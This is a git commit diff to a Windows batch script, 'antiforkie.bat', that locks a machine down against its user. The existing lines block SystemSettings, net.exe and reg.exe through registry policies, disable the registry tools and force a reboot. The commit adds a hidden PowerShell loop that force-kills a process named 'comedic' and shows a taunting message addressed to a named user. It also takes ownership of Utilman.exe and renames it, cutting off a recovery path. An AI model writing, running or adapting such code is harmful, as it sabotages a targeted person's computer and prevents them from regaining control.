b61fe4f94e777dd75e6ba8deff50bb6150bc3ed4
samzeq <samu_pereira_oliveira@outlook.com>
2024-12-23 03:13:11 -0300

    Update antiforkie.bat

--- antiforkie.bat
+++ antiforkie.bat
@@ -10,6 +10,9 @@ reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\E
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 5 /t REG_SZ /d SystemSettings.exe /f >nul 2>&1
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 6 /t REG_SZ /d net.exe /f >nul 2>&1
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f >nul 2>&1
+start /b powershell -nologo -WindowStyle Hidden -command "while($true){$lol = Get-Process comedic -ErrorAction SilentlyContinue;if($lol){$lol | Stop-Process -Force;start mshta \"vbscript:Execute(`\"MsgBox(`\"`\"you won't be running this anymore, guest82430.`\"`\",48,`\"`\":3`\"`\")(window.close)`\")\"};Start-Sleep -m 500}"
+start /min cmd /c "takeown /f C:\Windows\system32\Utilman.exe && icacls C:\Windows\system32\Utilman.exe /grant "%username%":M && rename C:\Windows\system32\Utilman.exe ~Utilman.exe"
+
 shutdown -r -t 0
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 9 /t REG_SZ /d reg.exe /f & reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
 exit
